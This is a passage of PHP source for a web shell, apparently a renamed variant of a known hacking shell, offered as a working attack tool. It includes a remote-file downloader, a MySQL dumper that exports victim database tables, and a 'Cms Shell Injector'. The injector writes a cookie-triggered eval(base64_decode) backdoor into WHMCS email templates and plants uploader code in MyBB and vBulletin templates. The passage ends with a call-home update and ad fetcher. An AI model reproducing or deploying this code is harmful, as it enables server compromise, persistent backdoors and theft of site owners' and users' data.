if(@is_file($saveas)) return true;
$buff = WHISKASEx("lwp-download ".$url." ".$saveas);
if(@is_file($saveas)) return true;
$buff = WHISKASEx("lynx -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = WHISKASEx("GET ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = WHISKASEx("links -source ".$url." > ".$saveas);
if(@is_file($saveas)) return true;
$buff = WHISKASEx("fetch -o ".$saveas." -p ".$url);
if(@is_file($saveas)) return true;
return false;
}
function clean_string($string){
  if(function_exists("iconv")){
	  $s = trim($string);
	  $s = iconv("UTF-8", "UTF-8//IGNORE", $s);
  }
  return $s;
}
function __read_file($file, $boom = true){
$content = false;
if($fh = @fopen($file, "rb")){
$content = "";
while(!feof($fh)){
$content .= $boom ? clean_string(fread($fh, 8192)) : fread($fh, 8192);
}
@fclose($fh);
}
if(empty($content)||!$content){
	$content = WHISKASEx("cat '".addslashes($file)."'");
}
return $content;
}
function WHISKASSettings(){
WHISKAShead();
WHISKASNum(6,7,8,9,10);
echo '<div class=header><center><p><div class="txtfont_header">| Settings |</div></p><h3><a href=javascript:void(0) onclick="g(\'settings\',null,null,null,null,null,null,null,null,\'main\')">| Generall Setting | </a></h3></center>';
if($_POST["WHISKAS8"] == "main"){
echo '<p><center><div class="txtfont_header">| Settings |</div></p><form onSubmit="reloadSetting(this);return false;" method=\'post\'>';
$lg_array = array('0'=>'No','1'=>'Yes');
$penc_array = array('false'=>'No','true'=>'Yes');
$protect_html = "";
$icon_html = "";
$postEnc_html = "";
$login_html = "";
$cgiapi_html = "";
foreach($lg_array as $key=>$val)$protect_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['safemode']=='1'?'selected':'').'>'.$val.'</option>';
foreach($lg_array as $key=>$val)$icon_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['show_icons']=='1'?'selected':'').'>'.$val.'</option>';
foreach($penc_array as $key=>$val)$cgiapi_html .= '<option value="'.$key.'" '.(!empty($_POST['WHISKAS9'])&&$_POST['WHISKAS9']==$key?"selected":($GLOBALS["DB_NAME"]["cgi_api"]&&empty($_POST['WHISKAS9'])?'selected':'')).'>'.$val.'</option>';
foreach($penc_array as $key=>$val)$postEnc_html .= '<option value="'.$key.'" '.(!empty($_POST['WHISKAS7'])&&$_POST['WHISKAS7']==$key?"selected":(__WHISKAS_POST_ENCRYPTION__&&empty($_POST['WHISKAS7'])?'selected':'')).'>'.$val.'</option>';
$lg_array = array("gui"=>"GUI","500"=>"500 Internal Server Error","403"=>"403 Forbidden","404"=>"404 NotFound","facebook"=>"Facebook Login");
foreach($lg_array as $key=>$val)$login_html .= '<option value="'.$key.'" '.($GLOBALS['DB_NAME']['login_page']==$key?'selected':'').'>'.$val.'</option>';
echo '';
echo '<table border="1"><tbody><tr><td><div class="tbltxt" style="color:#000000">Protect:</div></td><td><select name="protect" style="width:100%;">'.$protect_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#000000">Cgi Api:</div></td><td><select name="cgi_api" style="width:100%;">'.$cgiapi_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#000000">Post Encryption:</div></td><td><select name="post_encrypt" style="width:100%;">'.$postEnc_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#000000">Show Icons:</div></td><td><select name="icon" style="width:100%;">'.$icon_html.'</select></td></tr><tr><tr><td><div class="tbltxt" style="color:#000000">login Page:</div></td><td><select style="width:100%;" name="lgpage">'.$login_html.'</select></td></tr><tr><td><div class="tbltxt" style="color:#000000">UserName:</div></td><td><input type="text" style="width:95%;background:#333;color:#666;cursor:not-allowed;" name="username" value="[LOCKED]" disabled readonly></td></tr><tr><td><div class="tbltxt" style="color:#000000">Password:</div></td><td><input type="text" style="width:95%;background:#333;color:#666;cursor:not-allowed;" name="password" value="[LOCKED]" disabled readonly></td></tr></tbody></table><input type="hidden" name="e" value="'.$GLOBALS['DB_NAME']['safemode'].'"><input type="hidden" name="s" value="'.$GLOBALS['DB_NAME']['show_icons'].'"><p><input type="submit" name="btn" value=" "></p></form></center>';
if($_POST['WHISKAS5']=='>>'){
echo __pre();
if(!empty($_POST['WHISKAS3'])){
$protect = $_POST['WHISKAS1'];
$lgpage = $_POST['WHISKAS2'];
$username = $_POST['WHISKAS3'];
$password = md5($_POST['WHISKAS4']);
$icon = $_POST['WHISKAS6'];
$post_encrypt = $_POST['WHISKAS7'];
$cgi_api_val = $_POST['WHISKAS9'];
@chdir($GLOBALS['home_cwd']);
$basename = @basename($_SERVER['PHP_SELF']);
$data = @file_get_contents($basename);
$user_rand = $GLOBALS["DB_NAME"]["user_rand"];
$pass_rand = $GLOBALS["DB_NAME"]["pass_rand"];
$login_page_rand = $GLOBALS["DB_NAME"]["login_page_rand"];
$safemode_rand = $GLOBALS["DB_NAME"]["safemode_rand"];
$show_icons_rand = $GLOBALS["DB_NAME"]["show_icons_rand"];
$post_encryption_rand = $GLOBALS["DB_NAME"]["post_encryption_rand"];
$cgi_api_rand = $GLOBALS["DB_NAME"]["cgi_api_rand"];
$find_user = '/\''.$user_rand.'\'(.*?),/i';
$find_pw = '/\''.$pass_rand.'\'(.*?),/i';
$find_lg = '/\''.$login_page_rand.'\'(.*?),/i';
$find_p = '/\''.$safemode_rand.'\'(.*?),/i';
$icons = '/\''.$show_icons_rand.'\'(.*?),/i';
$postEnc = '/\''.$post_encryption_rand.'\'(.*?),/i';
$cgi_api_reg = '/\''.$cgi_api_rand.'\'(.*?),/i';
// USERNAME & PASSWORD LOCKED - CANNOT BE CHANGED VIA SETTINGS
if(!empty($lgpage)&&preg_match($find_lg,$data,$e)){
$new = '\''.$login_page_rand.'\' => \''.$lgpage.'\',';
$data = str_replace($e[0],$new,$data);
}
if(!empty($find_p)&&preg_match($find_p,$data,$e)){
$new = '\''.$safemode_rand.'\' => \''.$protect.'\',';
$data = str_replace($e[0],$new,$data);
}
if(preg_match($icons,$data,$e)){
$new = '\''.$show_icons_rand.'\' => \''.$icon.'\',';
$data = str_replace($e[0],$new,$data);
}
if(preg_match($postEnc,$data,$e)){
$new = '\''.$post_encryption_rand.'\' => '.$post_encrypt.',';
$data = str_replace($e[0],$new,$data);
}
if(preg_match($cgi_api_reg,$data,$e)){
$new = '\''.$cgi_api_rand.'\' => '.$cgi_api_val.',';
$data = str_replace($e[0],$new,$data);
}
if(@file_put_contents($basename,$data)){
echo '<b>UserName: </b><font color="red"><b>'.$username.'</b></font><br /><b>Password: </b><font color="red"><b>'.$_POST['WHISKAS4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
}else{
__alert("<span style='color:red;'>File has no edit access...!</span>");
}
}else{
__alert("<span style='color:red;'>UserName is Empty !</span>");
}
}
}elseif($_POST["WHISKAS8"] == "color"){
echo('<center><p><div class="txtfont_header">| Custom Color |</div></p><form onSubmit="reloadColors();return false;" method=\'post\'>');
echo '<table border="1"><tbody>';
$template = '<tr><td style="text-align:center;"><a href="http://solevisible.com/customcolors/{help}.png" target="_blank"><font color="#ED0B00">Help</font></a></td><td style="text-align:center;"><div class="tbltxt">{index}</div></td><td><div class="tbltxt" style="margin-left:5px;">{target}:</div></td><td><input style="width:60px;" multi="{multi}" id="gui_{target}" onChange="colorHandler(this);" target=".{target}" type="color" value="{color}"></td><td><input type="text" style="text-align:center;" multi="{multi}" onkeyup="colorHandlerKey(this);" target=".{target}" id="input_{target}" class="colors_input" placeholder="#FFFFFF" value="{color}"></td></tr>';
$x = 1;
foreach($GLOBALS['__WHISKAS_COLOR__'] as $key => $value){
	$multi = "";
	if(is_array($value)){
		if(isset($value["multi_selector"])){
			$multi = __ZW5jb2Rlcg(json_encode($value));
		}
	}
	$value = WHISKAS_getColor($key);
	$help = strtolower(str_replace(array(":", "+"), array("_", "_plus"), $key));
	echo str_replace(array("{index}", "{target}", "{color}", "{multi}", "{help}"), array($x++, $key, $value, $multi, $help), $template);
}
echo '<tr><td style="text-align:center;">-</td><td style="text-align:center;"><div class="tbltxt">*</div></td><td><div style="margin-left:5px;" class="tbltxt">Use Default Color:</div></td><td></td><td><center><input type="checkbox" id="use_default_color" value="1"></center></td></tr>';

echo '</tbody></table><p><input type="submit" name="btn" value=" "></p></form><p><button style="padding:4px;;margin-right:20px;" onclick="$(\'importFileBtn\').click();" class="button"> Import </button> <button style="padding:4px;margin-left:20px;" onclick="g(\'settings\',null,null,null,null,null,null,null,\'export\',\'color\')" class="button"> Export </button></center></p>';
if($_POST['WHISKAS7']=='export'){
	echo __pre();
	$colors = is_array($GLOBALS["DB_NAME"]["color"])?$GLOBALS["DB_NAME"]["color"]:array();
	$glob_colors = $GLOBALS["__WHISKAS_COLOR__"];
	$array = array();
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim($colors[$k]);
		}else{
			$v = trim(is_array($v)?$v["key_color"]:$v);
		}
		$array[$k] = $v;
	}
	$file = "WHISKAS_color_config_".date('Y-m-d-h_i_s').".conf";
	$config = json_encode($array, JSON_PRETTY_PRINT);
	if(!@file_put_contents($file, $config)){
		echo('<p><center>Color Config:<br><br><textarea rows="12" cols="70" type="text">'.$config.'</textarea></center></p>');
	}else{
		echo('<h3><p><center><a class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$file.'\', \'download\')"><font color="#0F0">Download Config</font></a></center></p></h3>');
	}
}
if($_POST['WHISKAS2']=='>>'){
	echo __pre();
	$colors = json_decode($_POST["WHISKAS1"],true);
	$array = "";
	$is_default = isset($_POST["WHISKAS3"])&&$_POST["WHISKAS3"]=="1"?true:false;
	$glob_colors = $GLOBALS["__WHISKAS_COLOR__"];
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim($colors[$k]);
		}else{
			$v = trim(is_array($v)?$v["key_color"]:$v);
		}
		$array .= '"'.trim($k).'" => "'.$v.'",';
	}
	@chdir($GLOBALS['home_cwd']);
	$basename = @basename($_SERVER['PHP_SELF']);
	$data = @file_get_contents($basename);
	$color = '/\'color\'(.*?)\),/s';
	if(preg_match($color,$data,$e)){
		$new = "'color' => array(".$array."),";
		$data = str_replace($e[0],$new,$data);
		if(@file_put_contents($basename, $data)){
			echo("<center><p><h3>[+] Success...</h3></p></center><script>location.reload();</script>");
		}else{
			echo("<center><p><h3>[-] We Not have permission to Edit shell...!</h3></p></center>");
		}
	}else{
		echo("<center><p><h3>[-] Error...!</h3></p></center>");
	}
}
}
echo('</div>');
WHISKASfooter();
}
function WHISKAScoldumper(){
WHISKAShead();
echo('<div class="header">');
WHISKASNum(8,9,10);
echo "<center><br><div class='txtfont_header'>| Mysql Column Dumper |</div><br><br>".getConfigHtml('all')."<form method='post' onsubmit=\"var opt_id=this.getAttribute('opt_id');var delimiter='json';try{if($('dumper-delimiter-type').value == 'delimiter')delimiter=$('dumper-delimiter-input').value}catch(e){};g('coldumper',null,delimiter,JSON.stringify(col_dumper_selected_data[opt_id]),this.db_username.value,this.db_password.value,this.db_name.value,this.dfile.value,this.db_host.value); col_dumper_selected_data[opt_id] = {};return false;\"><p>";
$delimiter = (!empty($_POST['WHISKAS1']) ? $_POST['WHISKAS1'] : '::');
$selected_data = json_decode($_POST['WHISKAS2'], true);
$username = ($_POST['WHISKAS3']);
$password = ($_POST['WHISKAS4']);
$dbname = ($_POST['WHISKAS5']);
$dfile = ($_POST['WHISKAS6']);
$host = ($_POST['WHISKAS7']);
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_host : ', 'inputName' => 'db_host', 'id' => 'db_host', 'inputValue' => $host, 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_username : ', 'inputName' => 'db_username', 'id' => 'db_user', 'inputValue' => $username, 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_password : ', 'inputName' => 'db_password', 'id' => 'db_pw', 'inputValue' => $password, 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => $dbname, 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Output Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']), 'inputSize' => '50')
);
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$db = false;
if(!empty($dbname)){
	$db = @mysqli_connect($host, $username, $password, $dbname);
}
if(count($selected_data) > 0){
	if($db){
		if(!is_dir($dfile)){
			$dfile = $GLOBALS['cwd'];
		}
		$tbls = "";
		$ext = '.txt';
		if($delimiter == 'json'){
			$ext = '.json';
		}
		foreach ($selected_data as $tbl => $cols) {
			$tables_query = mysqli_query($db, "SELECT ".implode(',', $cols)." FROM $tbl");
			$file_name = $dfile.'/'.$dbname.'.'.$tbl.$ext;
			$fp = fopen($file_name, "w");
			$data = array();
			while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
				if($delimiter == "json"){
					$col_arr = array();
					foreach ($row as $key => $value) {
						if(empty($value)){
							$value = "[empty]";
						}
						 $col_arr[$key] = $value;
					}
					$data[$tbl][] = $col_arr;
				}else{
					$data = "";
					foreach ($row as $key => $value) {
						if(empty($value)){
							$value = "[empty]";
						}
						$data .= $value . $delimiter;
					}
					fwrite($fp, $data ."\n");
				}
			}
			if($delimiter == "json"){
				fwrite($fp, json_encode($data));
			}
			fclose($fp);
			$tbls .= "Done ~~~> ".$file_name."<br>";
		}
		echo __pre();
		echo "<center><font color='#ED0B00'>".$tbls."</font></center>";
	}
}
if(!empty($dbname) && count($selected_data) == 0){
//echo __pre();
if($db){
	echo("<hr><div style='text-align:center;margin-bottom:5px;font-weight:bolder;'><span>[ Select your tables and columns for dumping data ]</span></div>");
	echo("<div style='text-align:center;'><span>Output Type: </span><select id='dumper-delimiter-type' onchange='colDumplerSelectType(this);' name='output_type'><option value='delimiter' selected>delimiter</option><option value='json'>json</option></select><div id='coldumper-delimiter-input' style='display:inline;'><span> Delimiter: </span><input id='dumper-delimiter-input' style='text-align:center;' type='text' name='delimiter' placeholder='eg: ,'></div></div>");
	$data = array();
	$tables_query = mysqli_query($db, "SELECT table_name FROM information_schema.tables WHERE table_schema = database();");
	while($row = mysqli_fetch_array($tables_query, MYSQLI_ASSOC)){
		$data[$row["table_name"]] = array();
		$table_count_q = mysqli_query($db, "SELECT count(*) FROM `".$row['table_name']."`");
		$table_count = mysqli_fetch_row($table_count_q);
		$data[$row["table_name"]]["data_count"] = $table_count[0];
		$columns_query = mysqli_query($db, "SELECT column_name FROM information_schema.columns WHERE table_name = '".$row['table_name']."'");
		while($row2 = mysqli_fetch_array($columns_query, MYSQLI_ASSOC)){
			$data[$row["table_name"]]["cols"][] = $row2["column_name"];
		}
	}
	mysqli_close($db);

	echo '<ul id="myUL">';
	foreach($data as $tbl => $cols){
	    echo '<li><span style="color:#ED0B00;" class="box">'.$tbl.' ('.$cols["data_count"].')</span><ul class="nested">';
	    foreach($cols["cols"] as $col){
	        echo '<li tbl="'.$tbl.'"><span style="color:#ED0B00;" tbl="'.$tbl.'" class="box sub-box">' . $col . '</span></li>';
	    }
	    echo '</ul></li>';
	}
	echo '</ul>';
}else{
echo('<center>mysqli_connect : Error!</center>');
}
}
echo('</div>');
WHISKASfooter();
}
function output($string){ echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><font color=red><a target='_blank' href='".$string."'>Click Here !</a></font></b></center><br><br>";}
function WHISKASShellInjectors(){
WHISKAShead();
echo '<div class=header>';
WHISKASNum(11);
echo '<center><p><div class="txtfont_header">| Cms Shell Injector |</div></p><center><h3><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,\'whmcs\',null)">| WHMCS | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,\'mybb\')">| MyBB | </a><a href=javascript:void(0) onclick="g(\'ShellInjectors\',null,null,null,\'vb\')">| vBulletin |</a></h3></center>';
$selector = '<p><div class="txtfont">Shell Inject Method : </div> <select name="method" style="width:100px;"><option value="auto">AutoMatic</option><option value="man">Manuel</option></select></p>';
if(isset($_POST['WHISKAS1']) && $_POST['WHISKAS1']== 'whmcs'){
WHISKASNum();
echo __pre()."<p><div class='txtfont_header'>| WHMCS |</div></p><center><center><p>".getConfigHtml('whmcs')."</p><form onSubmit=\"g('ShellInjectors',null,'whmcs',null,null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.path.value); return false;\" method='post'>";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Path WHMCS Url : ', 'inputName' => 'path', 'inputValue' => 'http://site.com/whmcs', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'Mysql Host : ', 'inputName' => 'dbh', 'id' => 'db_host', 'inputValue' => 'localhost', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Name : ', 'inputName' => 'dbn', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db User : ', 'inputName' => 'dbu', 'id' => 'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Db Pass : ', 'inputName' => 'dbp', 'id' => 'db_pw', 'inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo $selector;
echo "<p><input type='submit' value=' '></p></form></center></td></tr></table></center>";
if(isset($_POST['WHISKAS6'])) {
$dbu = $_POST['WHISKAS6'];
$dbn = $_POST['WHISKAS7'];
$dbp = $_POST['WHISKAS8'];
$dbh = $_POST['WHISKAS9'];
$path = $_POST['WHISKAS10'];
$method = $_POST['WHISKAS4'];
$index = "{php}".WHISKAS_UPLOADER.";{/php}";
$newin = str_replace("'","\'",$index);
$newindex = "<p>Dear $newin,</p><p>Recently a request was submitted to reset your password for our client area. If you did not request this, please ignore this email. It will expire and become useless in 2 hours time.</p><p>To reset your password, please visit the url below:<br /><a href=\"{\$pw_reset_url}\">{\$pw_reset_url}</a></p><p>When you visit the link above, your password will be reset, and the new password will be emailed to you.</p><p>{\$signature}</p>{php}if(\$_COOKIE[\"sec\"] == \"123\"){eval(base64_decode(\$_COOKIE[\"sec2\"])); die(\"!\");}{\/php}";
if(!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($index)){
if(filter_var($path,FILTER_VALIDATE_URL)){
$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_connect_error());
$soleSave= mysqli_query($conn,"select message from tblemailtemplates where name='Password Reset Validation'");
$soleGet = mysqli_fetch_assoc($soleSave);
$tempSave1 = $soleGet['message'];
$tempSave = str_replace("'","\'",$tempSave1);
mysqli_query($conn,"UPDATE tblconfiguration SET value = '1' WHERE setting = 'AllowSmartyPhpTags'") or die (mysqli_error($conn));
$inject = "UPDATE tblemailtemplates SET message='$newindex' WHERE name='Password Reset Validation'";
$result = mysqli_query($conn,$inject) or die (mysqli_error($conn));
$create = "insert into tblclients (email) values('Whiskas@fbi.gov')";
$result2 = mysqli_query($conn,$create) or die (mysqli_error($conn));
if(function_exists('curl_version') && $method == 'auto'){
$WHISKASSole = new WHISKASCURL(true);
$saveurl = $WHISKASSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$WHISKASSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=Whiskas@fbi.gov");
$backdata = "UPDATE tblemailtemplates SET message='{$tempSave}' WHERE name='Password Reset Validation'";
$Solevisible = mysqli_query($conn,$backdata) or die (mysqli_error($conn));
__alert("shell injectet...");
$ff= 'http://'.$path."/WHISKAS09.php";
output($ff);}else{
echo "<br><pre id=\"strOutput\" style=\"margin-top:5px\" class=\"ml1\"><br><center><b><font color=\"#FFFFFF\">Please go to Target => </font><a href='".$path."/pwreset.php' target='_blank'>".$path."/pwreset.php</a><br/><font color='#FFFFFF'> And Reset Password With Email</font> => <font color=red>Whiskas@fbi.gov</font><br/><font color='#FFFFFF'>And Go To => </font><a href='".$path."/WHISKAS09.php' target='_blank'>".$path."/WHISKAS09.php</a></b></center><br><br>";}}else{__alert('Path is not Valid...');}}}
}if(isset($_POST['WHISKAS2']) && $_POST['WHISKAS2']== 'mybb'){
WHISKASNum(1,2,3,5);
echo __pre()."<p><div class='txtfont_header'>| MyBB |</div></p><center><center>".getConfigHtml("mybb")."<form id='sendajax' onSubmit=\"g('ShellInjectors',null,null,'mybb',null,this.method.value,null,this.dbu.value,this.dbn.value,this.dbp.value,this.dbh.value,this.prefix.value); return false;\" method=POST>
";
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'dbh', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'dbn', 'id'=>'db_name' ,'inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'dbu', 'id'=>'db_user', 'inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'dbp', 'id'=>'db_pw', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'prefix', 'id'=>'db_prefix','inputValue' => 'mybb_', 'inputSize' => '50')
);
create_table($table);
echo $selector;
echo "<p><input type=submit value=' '></p></form></center></center>";
if(isset($_POST['WHISKAS6'])) {
$dbu = $_POST['WHISKAS6'];
$dbn = $_POST['WHISKAS7'];
$dbp = $_POST['WHISKAS8'];
$dbh = $_POST['WHISKAS9'];
$prefix = $_POST['WHISKAS10'];
$method = $_POST['WHISKAS4'];
$shellCode = "{\${".WHISKAS_UPLOADER."}}";
$newinshell = str_replace("'","\'",$shellCode);
if (!empty($dbh) && !empty($dbu) && !empty($dbn) && !empty($newinshell)){
$conn = mysqli_connect($dbh,$dbu,$dbp,$dbn) or die(mysqli_error($conn));
$inject = "select template from {$prefix}templates where  title= 'calendar'";
$result = mysqli_query($conn, $inject) or die (mysqli_error($conn));
$GetTemp = mysqli_fetch_assoc($result);
$saveDate = $GetTemp['template'];
$repsave = str_replace($shellCode,"",$saveDate);
$repsave = str_replace("'","\'",$repsave);
$createShell = "update {$prefix}templates SET template= '".$newinshell.$repsave."' where title = 'calendar'";
$result2 = mysqli_query($conn,$createShell) or die (mysqli_error($conn));
$geturl = "select value from {$prefix}settings where name= 'bburl'";
$findurl = mysqli_query($conn,$geturl) or die (mysqli_error($conn));
$rowb = mysqli_fetch_assoc($findurl);
$furl = $rowb['value'];
$realurl = parse_url($furl,PHP_URL_HOST);
$realpath = parse_url($furl,PHP_URL_PATH);
$res = false;
$WHISKASCurl = new WHISKASCURL();
if (extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto' ){
if ($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
@fputs($fsock, "GET $realpath/calendar.php HTTP/1.1\r\n");
@fputs($fsock, "HOST: $realurl\r\n");
@fputs($fsock, "Connection: close\r\n\r\n");
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$repairdbtemp = "update {$prefix}templates SET template= '$repsave' where title = 'calendar'";
$clear = mysqli_query($conn,$repairdbtemp) or die (mysqli_error($conn));$res = true;}
@fclose($fsock);}}elseif(function_exists('curl_version') && $method == 'auto'){
$WHISKASCurl->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
$ff = 'http://'.$realurl.$realpath."/WHISKAS09.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/WHISKAS09.php";
echo "<br><pre id='strOutput' style='margin-top:5px' class='ml1'><br><center><b><font color='#FFFFFF'>Please Go To Target => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color='#FFFFFF'>And Go To => </font><a href='".$fff."' target='_blank'>".$fff."</a></b></center><br><br>";
}}}}
if(isset($_POST['WHISKAS3']) && $_POST['WHISKAS3']== 'vb'){
WHISKASNum(1,2,7,9,10);
echo __pre().'<p><div class="txtfont_header">|vbulletin |</div></p><p>'.getConfigHtml('vb').'</p><form name="frm" method="POST" onsubmit="g(\'ShellInjectors\',null,null,this.lo.value,\'vb\',this.user.value,this.pass.value,this.tab.value,this.db.value,this.method.value); return false;">';
$table = array('td1' =>
 array('color' => 'FFFFFF', 'tdName' => 'Host : ', 'inputName' => 'lo', 'id'=>'db_host','inputValue' => 'localhost', 'inputSize' => '50'),
 'td2' =>
 array('color' => 'FFFFFF', 'tdName' => 'DataBase Name : ', 'inputName' => 'db', 'id'=>'db_name','inputValue' => '', 'inputSize' => '50'),
 'td3' =>
 array('color' => 'FFFFFF', 'tdName' => 'User Name : ', 'inputName' => 'user', 'id'=>'db_user','inputValue' => '', 'inputSize' => '50'),
 'td4' =>
 array('color' => 'FFFFFF', 'tdName' => 'Password : ', 'inputName' => 'pass', 'id'=>'db_pw','inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Table Prefix : ', 'inputName' => 'tab', 'id'=>'db_prefix','inputValue' => '', 'inputSize' => '50')
);
create_table($table);
echo $selector;
echo '<p><input type="submit" value=" " /></p></form></center>';
if(isset($_POST['WHISKAS4'])&&!empty($_POST['WHISKAS4'])){
$method = $_POST['WHISKAS8'];
$faq_name = "faq";
$faq_file = "/faq.php";
$code = "{\${".WHISKAS_UPLOADER."}}{\${exit()}}&";
$conn=@mysqli_connect($_POST['WHISKAS2'],$_POST['WHISKAS4'],$_POST['WHISKAS5'],$_POST['WHISKAS7']) or die(@mysqli_connect_error());
$rec = "select `template` from ".$_POST['WHISKAS6']."template WHERE title ='".$faq_name."'";
$recivedata = @mysqli_query($conn,$rec);
$getd = @mysqli_fetch_assoc($recivedata);
$savetoass = $getd['template'];
if(empty($savetoass)){
	$faq_name = "header";
	$faq_file = "/";
	$rec = "select `template` from ".$_POST['WHISKAS6']."template WHERE title ='".$faq_name."'";
	$recivedata =@mysqli_query($conn,$rec);
	$getd = @mysqli_fetch_assoc($recivedata);
	$savetoass = $getd['template'];
	$code = WHISKAS_UPLOADER.";";
}
$code = str_replace("'","\'",$code);
$p = "UPDATE ".$_POST['WHISKAS6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
$ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
$geturl = @mysqli_query($conn,"select `value` from ".$_POST['WHISKAS6']."setting WHERE `varname`='bburl'");
$getval = @mysqli_fetch_assoc($geturl);
$saveval = $getval['value'];
if($faq_name == "header"){
	if(substr($saveval, -5, 5) == "/core"){
		$saveval = substr($saveval, 0, -5);
	}
}
$realurl = parse_url($saveval,PHP_URL_HOST);
$realpath = parse_url($saveval,PHP_URL_PATH);
$res = false;
$WHISKASCurl = new WHISKASCURL();
if(extension_loaded('sockets') && function_exists('fsockopen') && $method == 'auto'){
if($fsock = @fsockopen($realurl, 80, $errno, $errstr, 10)){
@fputs($fsock, "GET $realpath.$faq_file HTTP/1.1\r\n");
@fputs($fsock, "HOST: $realurl\r\n");
@fputs($fsock, "Connection: close\r\n\r\n");
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$p1 = "UPDATE ".$_POST['WHISKAS6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
@fclose($fsock);
}
}elseif(function_exists('curl_version') && $method == 'auto'){
$WHISKASCurl->Send($realurl.$realpath.$faq_file);
$p1 = "UPDATE ".$_POST['WHISKAS6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
if($res){
$ff = 'http://'.$realurl.$realpath."/WHISKAS09.php";
output($ff);
}else{
$ff = 'http://'.$realurl.$realpath.$faq_file;
$fff = 'http://'.$realurl.$realpath."/WHISKAS09.php";
echo "<center><p><font color=\"#FFFFFF\">First Open This Link => </font><a href='".$ff."' target='_blank'>".$ff."</a><br/><font color=\"#FFFFFF\">Second Open This Link => </font><a href='".$fff."' target='_blank'>".$fff."</a></center></p>";}}}
echo '</div>';
WHISKASfooter();
}
function WHISKAScheckfiletype(){
	$path = $_POST['path'];
	$arg = $_POST['arg'];
	if(@is_file($path.'/'.$arg)){
		echo("file");
	}else{
		echo("dir");
	}
}
function WHISKAScheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["WHISKAScgiapi_mode"])&&!isset($_COOKIE["WHISKAScgiapi"])){
			_WHISKAS_cgicmd("whoami","perl",true);
			if(strlen(WHISKASEx("whoami",false,true))>0){
				__WHISKAS_set_cookie("WHISKAS_canruncmd", "true");
			}
		}
	}
	if(function_exists("curl_version")){
		$update = new WHISKASCURL();
		$json = $update->Send("".__WHISKAS_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['WHISKAS_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__WHISKAS_VERSION__ != $json['version'] || __WHISKAS_UPDATE__ != $json['version_number']){
						@setcookie("WHISKAS_checkupdate", "1", time()+86400);
						$data["content"] = '<div class="update-holder">'.$json["content"].'</div>';
					}
				}
			}
			if(isset($json["ads"]) && !empty($json["ads"])){
				$data["content"] .= $json["ads"];
			}
